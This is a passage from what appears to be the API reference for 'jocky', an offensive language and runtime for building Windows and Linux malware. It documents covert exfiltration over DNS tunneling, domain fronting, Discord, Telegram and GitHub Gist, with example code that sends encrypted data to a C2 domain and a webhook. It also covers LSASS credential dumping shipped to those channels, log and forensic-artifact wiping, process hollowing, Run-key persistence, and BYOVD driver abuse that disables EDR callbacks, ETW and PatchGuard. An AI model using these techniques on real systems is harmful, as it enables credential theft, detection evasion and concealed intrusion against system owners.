    let my_pid: i32 = 1234;
    jocky_elevate_token(ctx, my_pid);

    jocky_byovd_unload(ctx);
}
```

> **Manual control alternative:** if you need to load multiple unsigned drivers
> back-to-back, you can call `jocky_disable_dse()` once, load them all via
> `NtLoadDriver`, then call `jocky_restore_dse()`.  Keep the total window time
> under 2 seconds.



## 11  Exfiltration  *(Windows only)*

Six functions covering encryption plus four covert channels.

> **Operational note:** always call `jocky_exfil_encrypt` before passing data
> to a channel function so the transmitted bytes reveal nothing about the
> original content even if the transport is observed.

---

### `jocky_exfil_encrypt(data, data_len, out, out_len) -> bool`

Generate a fresh random 16-byte RC4 session key, prepend it to `out`, and
encrypt `data` into `out+16`.

```
out layout:  [ 16 bytes: random RC4 key ][ data_len bytes: RC4(data, key) ]
```

`out` must be at least `data_len + 16` bytes.  `*out_len` is set to
`data_len + 16` on success.

The receiver recovers plaintext by calling `jocky_decrypt_rc4(blob+16, len-16, blob, 16)`.

```
ffi jocky_exfil_encrypt(i8*, i64, i8*, i8*) -> bool;
```

---

### `jocky_exfil_front(front_host, real_host, path, data, data_len) -> bool`

**Domain fronting via CDN** — POST `data` over HTTPS by exploiting the
gap between TLS SNI (what network inspection sees) and the HTTP Host header
(what the CDN routes on).

| Parameter    | Meaning |
|--------------|---------|
| `front_host` | CDN hostname used for TCP + TLS SNI, e.g. `"d111111abcdef8.cloudfront.net"` |
| `real_host`  | Actual backend injected as the HTTP `Host:` header |
| `path`       | URL path on the backend, e.g. `"/collect"` |
| `data`       | Request body (encrypt first) |

Network inspection logs a TLS connection to the CDN's domain.  The CDN
forwards the request to `real_host` based on the `Host` header.

```
ffi jocky_exfil_front(i8*, i8*, i8*, i8*, i64) -> bool;
```

---

### `jocky_exfil_dns(c2_domain, data, data_len) -> bool`

**DNS tunneling** — encode `data` as a sequence of DNS A-record queries.
No direct TCP/UDP connection to the C2 is needed; only DNS (port 53) must
reach the system resolver.

**Query format:**

```
<4-hex-seq>.<16-char-base32-chunk>.<c2_domain>
```

Each chunk carries 10 bytes of data (10 bytes → 16 base32 chars, well within
the 63-char DNS label limit).  Sequence numbers allow the authoritative
resolver to reassemble out-of-order queries.  A terminal sentinel query:

```
FFFF.END.<c2_domain>
```

signals end-of-stream.  DNS responses are not used; only the query labels
carry data.

**Server-side setup:** configure the authoritative NS for `c2_domain` to log
all queries.  Parse labels, base32-decode each chunk, reassemble by sequence.

```
ffi jocky_exfil_dns(i8*, i8*, i64) -> bool;
```

---

### `jocky_exfil_discord(webhook_url, data, data_len) -> bool`

**Discord webhook** — POST `base64(data)` as a Discord message using an
Incoming Webhook.

| Limit | Value |
|-------|-------|
| Max `content` field | 2 000 chars |
| Max data per call   | ≈ 1 500 bytes |

Data larger than 1 500 bytes is automatically split into multiple webhook
calls.

```
ffi jocky_exfil_discord(i8*, i8*, i64) -> bool;
```

**`webhook_url`** — full URL from the Discord webhook configuration, e.g.
`"https://discord.com/api/webhooks/1234567890/TOKEN"`.

---

### `jocky_exfil_telegram(bot_token, chat_id, data, data_len) -> bool`

**Telegram Bot API** — deliver `base64(data)` as a `sendMessage` call to a
bot-accessible chat or channel.

| Limit | Value |
|-------|-------|
| Max `text` field  | 4 096 chars |
| Max data per call | ≈ 3 000 bytes |

Data larger than 3 000 bytes is chunked automatically.

```
ffi jocky_exfil_telegram(i8*, i8*, i8*, i64) -> bool;
```

**Setup:** create a bot via `@BotFather`, add it to the target channel,
retrieve the `chat_id` via `getUpdates`.

---

### `jocky_exfil_github(token, gist_id, data, data_len) -> bool`

**GitHub Gist** — PATCH a Gist file (`d.txt`) with `base64(data)` via the
GitHub REST API.  The Gist can be secret (not listed publicly).

```
ffi jocky_exfil_github(i8*, i8*, i8*, i64) -> bool;
```

| Parameter  | Meaning |
|------------|---------|
| `token`    | PAT or fine-grained token with `gist` scope |
| `gist_id`  | 32-hex-char Gist ID from the URL |

**Retrieval:** `GET /gists/<gist_id>` and decode `files["d.txt"].content`.

---

### Full exfiltration example

```
ffi jocky_exfil_encrypt(i8*, i64, i8*, i8*) -> bool;
ffi jocky_exfil_dns(i8*, i8*, i64)           -> bool;
ffi jocky_exfil_discord(i8*, i8*, i64)       -> bool;

fn exfil(raw: i8*, raw_len: i64) -> void {
    // Allocate out buffer: raw_len + 16
    let enc_buf: i8* = 0;      // allocate raw_len + 16
    let enc_len: i64 = 0;

    let ok: bool = jocky_exfil_encrypt(raw, raw_len, enc_buf, &enc_len);
    if !ok { return; }

    // Primary: DNS (no direct TCP to C2)
    let sent: bool = jocky_exfil_dns("exfil.c2.example.com", enc_buf, enc_len);

    // Fallback: Discord webhook
    if !sent {
        jocky_exfil_discord(
            "https://discord.com/api/webhooks/111222333/TOKEN",
            enc_buf, enc_len
        );
    }
}
```

---

---

## Build Pipeline & PE Section Layout

`jockyc` runs these post-link steps (Windows, in order):

```
  link output
       │
  [--embed-driver]  ──► appendSection(.jdrv)   RC4-encrypted driver bytes
       │
  [--manifest]      ──► appendSection(.jmani)  IOCTL primitive table
       │
  [--pack]          ──► RC4 encrypt .text in-place  (.rdata left plaintext — IAT must survive)
                        appendSection(.jkey)   16-byte RC4 key + 4-byte OEP RVA
                        patch AddressOfEntryPoint → .jstub VirtAddr  (jocky_pack_stub_entry)
       │
  (always)          ──► appendSection(.jtamp)  XOR-folded CRC32 over all sections
```

---

### `.jdrv` section  (`--embed-driver <driver.sys>`)

Embedded driver, RC4-encrypted with a per-build random key.

```
Offset  Size  Field
0       8     magic      "JOCKYDRV"
8       4     orig_size  plaintext driver byte count
12      16    rc4_key    random 16-byte key
28      N     data       RC4(driver bytes, rc4_key)
```

Read at runtime by `jocky_byovd_load()`.

---

### `.jmani` section  (`--manifest <manifest.txt>`)

Compact binary table of named IOCTL primitives for `jocky_driver_invoke()`.

Manifest text file format (one entry per non-comment line):
```
# name         ioctl       in_bytes  out_bytes
read_phys      0x9C402584  8         4
write_phys     0x9C402588  12        0
read_msr       0x9C40258C  4         8
write_msr      0x9C402590  12        0
```

Binary encoding in the section:
```
Offset  Size  Field
0       4     magic    "JMNI"
4       4     version  0x00000001
8       4     count    number of entries
12+     var   entries  per entry: [1B name_len][N name][4B ioctl][2B in_sz][2B out_sz]
```

Read at runtime by `jocky_manifest_load()` (called automatically from `jocky_runtime_init()`).

---

### `.jkey` section  (`--pack`)

Holds the 16-byte RC4 key used to encrypt `.text` and the original entry point
(OEP) RVA.  The `.jstub` stub loader reads this at runtime, decrypts `.text`
in-place, then jumps to the OEP.

```
Offset  Size  Field
0       16    rc4_key   RC4 key used to encrypt .text
16       4    oep_rva   RVA of the original entry point (little-endian)
```

---

### `.jstub` section  (`--pack`)

Runtime PE decryptor.  Compiled from `src/runtime/pack/stub_loader.c`
(`#pragma clang section text=".jstub"` routes all code there), so the
linker places `jocky_pack_stub_entry` in `.jstub` as part of the normal
runtime build.  `packPE()` does not inject raw bytes — it simply reads the
section's `VirtAddr` and writes it into `AddressOfEntryPoint`, redirecting
the OS loader here before any user code runs.

`.rdata` is deliberately **not** encrypted so the Windows loader can resolve
the IAT before calling this entry point; `VirtualProtect` and
`FlushInstructionCache` are called normally through the resolved IAT.

**Execution sequence:**

1. `GetModuleHandleA(NULL)` → image base
2. Walk PE section table → locate `.jkey` (key + OEP RVA) and `.text`
3. `VirtualProtect(.text, PAGE_EXECUTE_READWRITE)`
4. RC4-decrypt `.text` in-place with the 16-byte key from `.jkey[0..15]`
5. `VirtualProtect(.text, PAGE_EXECUTE_READ)` (restore)
6. `FlushInstructionCache` → CPU sees decrypted bytes
7. Call `(image_base + oep_rva)` → original `main()`

The section is never itself encrypted (packPE skips `.jstub` during the
encryption pass).



### `.jtamp` section  (always added for Windows targets)

Anti-tamper checksum.  Computed last so it covers the final binary state,
including any embedded `.jdrv`, `.jmani`, and `.jkey` sections.

```
Offset  Size  Field
0       8     magic     "JOCKYTMP"
8       4     flags     0x00000001  (version / algorithm indicator)
12      4     checksum  XOR-fold of CRC32 over all other sections' raw data
```

Verified at startup by `jocky_verify_integrity()`.  Mismatch calls `ExitProcess(0xDEAD1337)`.

---

## Build flags that affect the runtime

| Flag | Effect |
|------|--------|
| *(none)* | Runtime compiled and linked in; `jocky_runtime_init()` auto-called from generated entry |
| `--no-runtime` | Runtime skipped entirely; none of the above functions exist |
| `--embed-driver <path>` | Driver embedded as `.jdrv` section; `jocky_byovd_load` can find it |
| `--manifest <path>` | IOCTL manifest embedded as `.jmani` section; `jocky_driver_invoke` uses it |
| `--pack` | PE sections RC4-encrypted (Windows) or UPX-packed (Linux) |
| *(always, Windows)* | `.jtamp` anti-tamper section added; verified at startup |

---

## 12  Credential Dumping  *(Windows only)*

LSASS dump via the **WerFaultSecure PPL bypass** — our process never opens a
handle to LSASS.  Instead, we spawn `WerFaultSecure.exe`, a Microsoft-signed
PPL process (`signingLevel WindowsTCB`) that Windows itself trusts to dump
protected processes.  Defender sees a legitimate system binary doing the dump.

All three functions require **SeDebugPrivilege** or SYSTEM.

---

### `jocky_lsass_pid() -> u32`

Walk the process list via `NtQuerySystemInformation(SystemProcessInformation)`
and return LSASS's PID.  Never calls `OpenProcess` on LSASS.

```
ffi jocky_lsass_pid() -> i32;   // returns 0 on failure
```

---

### `jocky_lsass_dump_werfault(out_buf, out_size) -> bool`

Full WerFaultSecure dump chain:

| Step | Action |
|------|--------|
| 1 | `jocky_lsass_pid()` → PID (no handle to LSASS) |
| 2 | Build cmdline: `WerFaultSecure.exe -u -p <lsass_pid> -ip <our_pid> -s 524288 /type 2` |
| 3 | `CreateProcessW(CREATE_NO_WINDOW)` → wait ≤ 30 s |
| 4 | Locate `%LOCALAPPDATA%\CrashDumps\lsass.exe.<lsass_pid>.dmp` |
| 5 | `ReadFile` → heap buffer (`*out_buf`, `*out_size`) |
| 6 | `DeleteFileW` immediately — no on-disk trace |

Caller must free `*out_buf` with `jocky_free()`.

```
ffi jocky_lsass_dump_werfault(i8**, i64*) -> bool;
```

---

### `jocky_lsass_exfil(exfil_url, exfil_type) -> bool`

Convenience wrapper: dump → RC4-encrypt (16-byte prepended key) → exfil.

| `exfil_type` | `exfil_url` format |
|---|---|
| `"discord"` | Full Discord webhook URL |
| `"telegram"` | `"<bot_token>:<chat_id>"` |
| `"github"` | `"<token>:<gist_id>"` |
| `"dns"` | C2 DNS zone (e.g. `"exfil.attacker.com"`) |
| `"http"` | Full HTTP/HTTPS URL |

```
ffi jocky_lsass_exfil(i8*, i8*) -> bool;
```

### Credential Dumping example

```jky
fn main() -> void {
    // Dump LSASS in-memory (WerFaultSecure does the actual dump)
    let buf:  i8* = null;
    let size: i64 = 0;
    let ok: bool = jocky_lsass_dump_werfault(&buf, &size);
    if !ok { return; }

    // ... parse with pypykatz-compatible reader, or just exfil raw ...
    jocky_free(buf);

    // Or in one call — dump + encrypt + ship to Discord:
    jocky_lsass_exfil("https://discord.com/api/webhooks/...", "discord");
}
```

---

## 14  Cleanup / Anti-Forensics  *(Windows only unless noted)*

Five targeted cleanup functions plus an orchestrator.  All require
Administrator-level privileges.  Call after payload execution, before exit.

---

### `jocky_wipe_prefetch() -> bool`

Deletes all `.pf` files from `%SystemRoot%\Prefetch` and removes
`Layout.ini`.  Prefetch files record the path and load-time metadata of every
executed binary.

```
ffi jocky_wipe_prefetch() -> bool;
```

---

### `jocky_patch_shimcache() -> bool`

Clears the Application Compatibility Cache (ShimCache) in two steps:

1. Delete `HKLM\SYSTEM\…\AppCompatCache` → `AppCompatCache` (REG_BINARY) so
   the cache is not written on next shutdown.
2. Call the undocumented `kernel32!BaseFlushAppcompatCache()` to evict the
   in-memory cache for the current session.

ShimCache records nearly every executed PE; entries persist across reboots.

```
ffi jocky_patch_shimcache() -> bool;
```

---

### `jocky_patch_amcache() -> bool`

Loads `C:\Windows\AppCompat\Programs\Amcache.hve` as a temporary registry
hive (requires `SeBackupPrivilege` + `SeRestorePrivilege`), finds all entries
whose path matches the current executable, deletes them, then unloads the hive.

Amcache records first-execution timestamps, file hashes, and full paths.

Searches two registry paths:
- `Root\InventoryApplicationFile\*` → value `LowerCaseLongPath` (Win10+)
- `Root\File\{VolumeGUID}\{SHA1}` → value `FullPath` (Win8)

```
ffi jocky_patch_amcache() -> bool;
```

---

### `jocky_clear_srum() -> bool`

Clears the System Resource Usage Monitor (SRUM) database, which tracks
per-process network usage, CPU time, and energy consumption for 30–60 days.

Steps:
1. Stop the `svsvc` service to release the file lock.
2. `DeleteFileW(C:\Windows\System32\sru\SRUDB.dat)` — Windows recreates an
   empty database on next boot.
3. If immediate deletion fails, schedule via `MoveFileEx(DELAY_UNTIL_REBOOT)`.
4. Restart `svsvc` so the system stays stable.

```
ffi jocky_clear_srum() -> bool;
```

---

### `jocky_cleanup_all() -> bool`

Runs all cleanup steps in the correct order:

| Step | Function |
|------|----------|
| 1 | `jocky_clear_logs()` |
| 2 | `jocky_wipe_prefetch()` |
| 3 | `jocky_patch_shimcache()` |
| 4 | `jocky_patch_amcache()` |
| 5 | `jocky_clear_srum()` |
| 6 | `jocky_wipe_artifacts()` |
| 7 | `jocky_self_delete()` |

Individual failures are non-fatal; all steps are attempted regardless.
Returns `true` only if every step succeeded.

`jocky_self_delete()` runs last so the binary is still alive during the other
steps.

```
ffi jocky_cleanup_all() -> bool;
```

**This is the recommended call for most programs.** Use the individual
functions only when you need finer control.

---

### Cleanup example

```jky
fn main() -> void {
    // No ffi declarations needed

    let flags: i32 = jocky_check_analysis_environment();
    if flags != 0 {
        jocky_cleanup_all();
        return;
    }

    jocky_unhook_ntdll();

    // ... payload work ...

    jocky_cleanup_all();   // single call: logs + prefetch + shimcache +
                           // amcache + srum + artifacts + self-delete
}
```

---

## 15  Module Loading  *(Linux & Windows)*

Cross-platform dynamic library loading for runtime symbol resolution.

### `jocky_module_load(path) -> void*`

Load a shared library (.so on Linux, .dll on Windows) at runtime.

- **On Linux**: Uses `dlopen(path, RTLD_LAZY | RTLD_LOCAL)`
- **On Windows**: Uses `LoadLibraryA(path)`

Returns an opaque module handle for use with other `jocky_module_*` functions.
Returns `null` on failure.

```jky
ffi jocky_module_load(i8*) -> i8*;

fn main() -> i32 {
    // Load libc on Linux
    let libc: i8* = jocky_module_load("/lib/x86_64-linux-gnu/libc.so.6");
    if libc == null { return -1; }
    
    // ... use symbols from libc ...
    
    jocky_module_unload(libc);
    return 0;
}
```

### `jocky_module_unload(handle) -> bool`

Unload a previously loaded module. Returns `true` on success, `false` on failure.

```jky
ffi jocky_module_unload(i8*) -> bool;
```

### `jocky_module_symbol(handle, symbol_name) -> void*`

Resolve a symbol (function or variable) from a loaded module.

Returns a pointer to the symbol, or `null` if not found.

```jky
ffi jocky_module_symbol(i8*, i8*) -> i8*;

fn main() -> i32 {
    let libc: i8* = jocky_module_load("/lib/x86_64-linux-gnu/libc.so.6");
    if libc == null { return -1; }
    
    // Get the printf function pointer
    let printf_ptr: i8* = jocky_module_symbol(libc, "printf");
    if printf_ptr == null { return -1; }
    
    // Call via function pointer (requires FFI wrapper for actual calls)
    return 0;
}
```

### `jocky_module_get_symbol(path, symbol_name) -> void*`

Convenience function combining `jocky_module_load` + `jocky_module_symbol`.

Loads a module and resolves a symbol in one call. Module remains loaded—call
`jocky_module_unload` when done. Returns `null` on any failure.

```jky
ffi jocky_module_get_symbol(i8*, i8*) -> i8*;

fn main() -> i32 {
    let printf_ptr: i8* = jocky_module_get_symbol(
        "/lib/x86_64-linux-gnu/libc.so.6", 
        "printf"
    );
    if printf_ptr == null { return -1; }
    return 0;
}
```

### `jocky_module_has_symbol(handle, symbol_name) -> bool`

Check if a symbol exists in a loaded module without resolving it.

Useful for feature detection. Returns `true` if the symbol exists, `false` otherwise.

```jky
ffi jocky_module_has_symbol(i8*, i8*) -> bool;

fn main() -> i32 {
    let libc: i8* = jocky_module_load("/lib/x86_64-linux-gnu/libc.so.6");
    
    // Check for specific glibc version features
    let has_getrandom: bool = jocky_module_has_symbol(libc, "getrandom");
    
    jocky_module_unload(libc);
    return has_getrandom ? 0 : 1;
}
```

### `jocky_module_base(path) -> i64`  *(Linux only)*

Get the base address of a loaded module by parsing `/proc/self/maps`.

Useful for calculating offsets from a module's base address. On Windows or if
the module is not loaded, returns `0`.

```jky
ffi jocky_module_base(i8*) -> i64;

fn main() -> i32 {
    // Get the base address of libc for ASLR calculation
    let base: i64 = jocky_module_base("/lib/x86_64-linux-gnu/libc.so.6");
    if base == 0 { return -1; }
    
    // Now can calculate offsets: libc_func_addr = base + offset_from_binary
    return 0;
}
```

---

## 16  Memory Allocators

These wrappers let Jocky code allocate heap memory without calling `malloc`
directly.  `jocky_byovd_new` / `jocky_byovd_destroy` are opaque-handle
constructors that hide the size of `jocky_byovd_t` from user code.

---

### `jocky_alloc(size) -> i8*`

Allocate and zero-initialise `size` bytes.

| Platform | Implementation |
|----------|----------------|
| Windows  | `HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)` |
| Linux    | `malloc(size)` + `memset(…, 0, size)` |

Returns `null` on failure or if `size ≤ 0`.

```
ffi jocky_alloc(i64) -> i8*;
```

---

### `jocky_free(ptr)`

Free memory previously returned by `jocky_alloc`.  No-op on `null`.

```
ffi jocky_free(i8*) -> void;
```

---

### `jocky_byovd_new() -> i8*`  *(Windows only)*

Allocate a zeroed `jocky_byovd_t` context (584 bytes on x64) and return an
opaque `i8*` pointer.  Pass this pointer to `jocky_byovd_load` and all
driver/kernel functions.  Free with `jocky_byovd_destroy`.

```
ffi jocky_byovd_new() -> i8*;
```

---

### `jocky_byovd_destroy(ctx)`  *(Windows only)*

Call `jocky_byovd_unload(ctx)` then `jocky_free(ctx)` in one step.
Safe to call on `null`.

```
ffi jocky_byovd_destroy(i8*) -> void;
```

---

### Allocator example

```jky
fn main() -> void {
    // Allocate without knowing sizeof(jocky_byovd_t)
    let ctx: i8* = jocky_byovd_new();
    if ctx == null { return; }

    let ok: bool = jocky_byovd_load("RTCore64", "RTCore64", ctx);
    if !ok {
        jocky_free(ctx);
        return;
    }

    jocky_disable_edr_callbacks(ctx);
    jocky_disable_etw(ctx);

    jocky_byovd_destroy(ctx);   // unload + free in one call
    jocky_cleanup_all();
}
```

---

## 17  Process Execution & Hollowing  *(Windows & Linux)*

Advanced process manipulation including in-memory execution and process hollowing.

### Windows Process Hollowing → `bool`

```
ffi jocky_process_hollow(
    target_image: i8*,       // Target process path (e.g., "C:\\Windows\\notepad.exe")
    payload: i8*,            // Shellcode/PE to inject
    payload_size: i64        // Size of payload
) -> bool;
```

Replaces a legitimate process image with malicious code:
1. Create suspended target process
2. Unmap legitimate image from memory
3. Allocate at original image base
4. Write payload (PE or shellcode)
5. Set entry point and resume

Returns `true` on success.

```jky
fn main() -> void {
    let payload: i8* = jocky_alloc(4096);
    // ... load shellcode into payload ...
    
    let ok: bool = jocky_process_hollow(
        "C:\\Windows\\notepad.exe",
        payload,
        4096
    );
    
    jocky_free(payload);
}
```

### Windows In-Memory Execution → `bool`

```
ffi jocky_inmem_execute(
    binary_data: i8*,        // PE binary in memory
    binary_size: i64         // Size of PE
) -> bool;
```

Execute PE binary directly from memory without touching disk:
1. Allocate memory for image base
2. Parse PE headers
3. Load sections with correct permissions
4. Relocate imports and fix up IAT
5. Execute from entry point

Returns `true` on successful execution.

### Linux Process Hollowing → `bool`

```
ffi jocky_linux_process_hollow(
    target_binary: i8*,      // Path to target binary
    new_entry_point: i64     // New execution address
) -> bool;
```

Replace process image on Linux systems using `ptrace`:
1. Attach to target process
2. Read original mappings via `/proc/[pid]/maps`
3. Unmap sections with `munmap`
4. Write new code
5. Set instruction pointer and detach

---

## 18  Windows Registry Manipulation

Direct Windows registry access and modification.

### Registry Operations

```
ffi jocky_registry_create_key(
    hive: i32,               // HKEY_* constant
    path: i8*,               // Registry path
    key_out: i8*             // Output key handle
) -> bool;

ffi jocky_registry_set_value(
    key: i8*,                // Registry key handle
    value_name: i8*,         // Value name
    value_data: i8*,         // Value data
    data_size: i64,          // Data size
    type: i32                // REG_SZ, REG_BINARY, etc.
) -> bool;

ffi jocky_registry_delete_key(
    hive: i32,
    path: i8*
) -> bool;

ffi jocky_registry_close_key(key: i8*) -> void;
```

**Common HKEY values:**
- `HKEY_CURRENT_USER` = 0x80000001
- `HKEY_LOCAL_MACHINE` = 0x80000002
- `HKEY_CLASSES_ROOT` = 0x80000000

**Value types:**
- `REG_SZ` = 1 (String)
- `REG_BINARY` = 3 (Binary)
- `REG_DWORD` = 4 (32-bit)
- `REG_QWORD` = 11 (64-bit)

### Registry Persistence Example

```jky
fn setup_persistence() -> bool {
    let key: i8* = jocky_alloc(256);
    
    let ok: bool = jocky_registry_create_key(
        0x80000002,  // HKEY_LOCAL_MACHINE
        "Software\\Microsoft\\Windows\\Run",
        key
    );
    
    if ok {
        jocky_registry_set_value(
            key,
            "WindowsUpdate",
            "C:\\ProgramData\\system.exe",
            32,
            1  // REG_SZ
        );
        jocky_registry_close_key(key);
    }
    
    jocky_free(key);
    return ok;
}
```

---

## 19  Advanced Forensics & Cleanup  *(Windows & Linux)*

Comprehensive artifact elimination beyond basic cleanup.

### Windows Advanced Cleanup

```
ffi jocky_cleanup_event_logs(
    log_names: i8*           // Comma-separated log names
) -> i32;                    // Count of logs cleaned

ffi jocky_cleanup_usn_journal() -> bool;      // USN Journal wipe
ffi jocky_cleanup_prefetch() -> bool;         // Prefetch cache deletion
ffi jocky_cleanup_mft_entries(file_path: i8*) -> bool;  // MFT record zeroing
```

**Example log names:** "Application,Security,System,PowerShell"

### Windows Self-Deletion

```
ffi jocky_self_delete() -> void;
```

Remove the running executable from disk:
1. Make file deletable (remove read-only)
2. Schedule deletion on next reboot (MoveFileEx with flags)
3. OR use a helper process + exit

Typically called at end of execution.

### Linux Advanced Cleanup

```
ffi jocky_linux_cleanup_bash_history() -> bool;
ffi jocky_linux_cleanup_syslog() -> bool;
ffi jocky_linux_cleanup_journal() -> bool;
ffi jocky_linux_cleanup_auth_logs() -> bool;
```

Wipe activity traces from Linux logging systems.

### Encrypted Artifact Log

```
ffi jocky_forensics_log_action(
    action: i8*,             // Description of action taken
    artifact_path: i8*,      // Path to artifact
    operation: i8*           // "COPIED", "ENCRYPTED", "DELETED"
) -> void;
```

Log all cleanup operations for audit trail. Logs are encrypted with AES-256 and stored in audit buffer.

---

## 20  Driver Interaction & DeviceIoControl  *(Windows, requires BYOVD)*

Low-level communication with loaded kernel drivers.

```
ffi jocky_driver_ioctl(
    driver_handle: i8*,      // Handle from jocky_byovd_load
    ioctl_code: i32,         // Device I/O control code
    input_buffer: i8*,       // Input data
    input_size: i64,         // Input size
    output_buffer: i8*,      // Output buffer
    output_size: i64,        // Output buffer size
    bytes_returned: i64*     // Bytes written to output
) -> bool;
```

Send commands directly to kernel driver.

### Example: Read Kernel Memory via BYOVD

```jky
fn read_kernel_memory(address: i64, size: i64) -> i8* {
    let ctx: i8* = jocky_byovd_new();
    let ok: bool = jocky_byovd_load("RTCore64", "RTCore64", ctx);
    
    if !ok {
        jocky_free(ctx);
        return null;
    }
    
    let buffer: i8* = jocky_alloc(size);
    let bytes_read: i64 = 0;
    
    let result: bool = jocky_driver_ioctl(
        ctx,
        0x82000000,      // IOCTL for RTCore64
        address as i8*,  // Kernel address to read
        8,               // Size of address
        buffer,          // Output buffer
        size,
        &bytes_read
    );
    
    jocky_byovd_destroy(ctx);
    return buffer;
}
```

---

## 21  Exploitation Framework  *(Windows, requires BYOVD & Driver Support)*

Complete kernel exploitation primitives for privilege escalation and system control.

### Kernel Read/Write Primitives

```
ffi jocky_kernel_read(
    address: i64,            // Kernel virtual address
    size: i64                // Bytes to read
) -> i8*;                    // Allocated buffer (free with jocky_free)

ffi jocky_kernel_write(
    address: i64,            // Kernel virtual address
    data: i8*,               // Data to write
    size: i64                // Bytes to write
) -> bool;
```

**Requirements:**
- `jocky_byovd_load()` must succeed
- Driver must support arbitrary memory I/O (RTCore64, NVIDIA, EVGA, etc.)
- Administrator privileges required

### Token Manipulation (Privilege Escalation)

```
ffi jocky_exploit_token_replacement(
    source_pid: i32,         // Process to steal token from (0 = System)
    target_pid: i32          // Process to give token to (0 = self)
) -> bool;
```

Replace process token with SYSTEM token:
1. Locate EPROCESS structures for source/target
2. Read source token
3. Write to target EPROCESS
4. Verify elevation

### Process Control Block Manipulation

```
ffi jocky_exploit_disable_callbacks() -> bool;
```

Disable kernel callback notifications:
1. Find PspCreateProcessNotifyRoutine table
2. Zero out callback pointers
3. Disables process creation monitoring

### PatchGuard Bypass

```
ffi jocky_exploit_disable_patchguard() -> bool;
```

Temporarily disable Windows PatchGuard (Kernel Patch Protection):
1. Detect HVCI support
2. Exploit known vulnerable paths
3. Set flag to disable checks

Returns `false` on Windows 11 with HVCI hardened.
